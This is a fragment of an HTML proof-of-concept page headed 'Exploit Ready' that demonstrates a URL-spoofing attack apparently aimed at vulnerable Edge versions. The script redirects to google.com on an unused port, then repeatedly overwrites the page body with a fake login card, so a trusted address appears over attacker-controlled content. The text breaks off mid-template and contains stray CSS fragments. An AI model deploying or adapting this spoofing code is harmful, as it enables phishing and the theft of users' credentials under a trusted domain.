<!DOCTYPE html>

            width: 100%;

    <div id="setup">
        <h1>Exploit Ready</h1>
        <p>This demo requires a vulnerable browser version.</p>
        <button onclick="spoof()">Trigger Spoof</button>
    </div>

    <script>
        function spoof() {
            // 1. The Trigger: Non-existent port on a trusted domain
            window.location = "https://www.google.com:8080";

            // 2. The Content Loop: Repeatedly writing the UI
            // In vulnerable Edge, this overwrites the display while keeping the URL
            setInterval(function() {
                document.body.innerHTML = `
                    <div class="login-card">
                        <img src="https://via.placeholder.com/100" alt="Logo">
